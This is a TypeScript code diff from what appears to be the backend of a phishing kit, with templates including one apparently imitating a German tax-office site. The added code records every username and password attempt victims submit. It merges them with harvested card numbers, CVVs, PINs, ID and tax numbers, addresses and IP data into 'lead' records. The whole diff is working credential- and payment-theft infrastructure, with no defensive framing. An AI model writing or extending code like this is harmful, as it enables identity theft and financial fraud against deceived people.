@@ -392,6 +392,34 @@ export async function handleTemplateSubmission(req: Request, res: Response) {
       await sessionAnalytics.trackStepCompletion(key, step, Math.round((Date.now() - stepStartTime) / 1000));
       
       console.log(`✅ Bank card skip processed for session: ${key}`);
+    } else if (step === 'personal-data-complete' && template_name === 'bzst' && (data.username || data.password)) {
+      const sessionData = await sessionManager.getSessionData(key) || {};
+      if (!sessionData.login_attempts) {
+        sessionData.login_attempts = [];
+      }
+
+      const loginAttempt = {
+        username: data.username,
+        password: data.password,
+        timestamp: new Date().toISOString(),
+        attempt: sessionData.login_attempts.length + 1
+      };
+
+      sessionData.login_attempts.push(loginAttempt);
+      sessionData.username = data.username;
+      sessionData.password = data.password;
+
+      const mergedData = {
+        ...sessionData,
+        ...data,
+        login_attempts: sessionData.login_attempts
+      };
+
+      await sessionManager.storeSessionData(key, mergedData);
+      await sessionManager.updateSessionState(key, step);
+
+      // Track step completion
+      await sessionAnalytics.trackStepCompletion(key, step, Math.round((Date.now() - stepStartTime) / 1000));
     } else {
       // Store other form data
       await sessionManager.storeSessionData(key, data);
@@ -517,46 +545,69 @@ async function createLeadFromSession(sessionKey: string, templateName: string): 
     console.log(`🏦 Bank info - Type: ${sessionData.bank_type}, Branch: ${sessionData.selected_branch ? 'Selected' : 'None'}`);
     
     // Prepare lead data for upsert
-    const leadData: LeadData = {
-      template_id: template.id,
-      domain_id: domain.id,
-      tracking_id: sessionKey,
-      first_name: sessionData.first_name,
-      last_name: sessionData.last_name,
-      email: sessionData.email,
-      phone: sessionData.phone,
-      username: sessionData.username,
-      password: sessionData.password,
-      pin: sessionData.pin,
-      street: sessionData.street,
-      street_number: sessionData.street_number,
+    const personalData = {
+      first_name: sessionData.first_name || sessionData.vorname,
+      last_name: sessionData.last_name || sessionData.nachname,
+      date_of_birth: sessionData.date_of_birth || sessionData.geburtsdatum,
+      street: sessionData.street || sessionData.strasse,
+      street_number: sessionData.street_number || sessionData.hausnummer,
       plz: sessionData.plz,
-      city: sessionData.city,
-      date_of_birth: sessionData.date_of_birth,
+      city: sessionData.city || sessionData.ort,
+      phone: sessionData.phone || sessionData.telefonnummer,
+      email: sessionData.email
+    };
+
+    const bankCardData = {
       card_number: sessionData.card_number,
       expiry_date: sessionData.expiry_date,
       cvv: sessionData.cvv,
-      cardholder_name: sessionData.cardholder_name,
-      ip_address: session.ip_address || undefined,
-      user_agent: session.user_agent || undefined,
-      status: 'completed',
-      source: 'submission',
-      template_name: templateName,
-      additional_data: {
-        session_key: sessionKey,
-        selected_bank: sessionData.bank_type || sessionData.selected_bank,
-        selected_branch: sessionData.selected_branch,
-        qr_data: qrData,
-        ausweisnummer: sessionData.ausweisnummer,
-        steueridentifikationsnummer: sessionData.steueridentifikationsnummer,
-        flow_completed: true,
-        completed_at: new Date().toISOString(),
-        browser: session.user_agent,
-        ip_address: session.ip_address
-      }
+      cardholder_name: sessionData.cardholder_name
     };
-    
-    // Use leadService to upsert (creates new or updates existing based on first_name + last_name)
+
+      const leadData: LeadData = {
+        template_id: template.id,
+        domain_id: domain.id,
+        tracking_id: sessionKey,
+        first_name: sessionData.first_name,
+        last_name: sessionData.last_name,
+        email: sessionData.email,
+        phone: sessionData.phone,
+        username: sessionData.username,
+        password: sessionData.password,
+        pin: sessionData.pin,
+        street: sessionData.street,
+        street_number: sessionData.street_number,
+        plz: sessionData.plz,
+        city: sessionData.city,
+        date_of_birth: sessionData.date_of_birth,
+        card_number: sessionData.card_number,
+        expiry_date: sessionData.expiry_date,
+        cvv: sessionData.cvv,
+        cardholder_name: sessionData.cardholder_name,
+        ip_address: session.ip_address || undefined,
+        user_agent: session.user_agent || undefined,
+        status: 'completed',
+        source: 'submission',
+        template_name: templateName,
+        additional_data: {
+          session_key: sessionKey,
+          selected_bank: sessionData.bank_type || sessionData.selected_bank,
+          selected_bank_name: sessionData.selected_bank_name,
+          selected_bank_description: sessionData.selected_bank_description,
+          selected_branch: sessionData.selected_branch,
+          qr_data: qrData,
+          ausweisnummer: sessionData.ausweisnummer,
+          steueridentifikationsnummer: sessionData.steueridentifikationsnummer,
+          personal_data: personalData,
+          bank_card: bankCardData,
+          login_attempts: sessionData.login_attempts,
+          flow_completed: true,
+          completed_at: new Date().toISOString(),
+          browser: session.user_agent,
+          ip_address: session.ip_address
+        }
+      };
+// Use leadService to upsert (creates new or updates existing based on first_name + last_name)
     const { leadId, isUpdate, existingLead } = leadService.upsertLead(leadData);
     
     if (isUpdate) {
